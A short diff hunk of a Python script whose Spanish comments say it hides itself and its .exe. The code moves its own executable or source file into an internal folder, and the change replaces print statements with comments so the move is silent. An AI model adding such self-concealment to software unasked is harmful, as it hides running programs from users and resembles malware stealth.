@@ -54,10 +54,10 @@ def main():
   
   # Escondo este script
   if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
-    print('running in a PyInstaller bundle')
+    # Inside a pyInstaller bundle
     shutil.move(sys.executable, internal_folder)
   else:
-    print('running in a normal Python process')
+    # Inside a normal python script
     shutil.move(__file__, internal_folder)
   
   # Esconde el .exe
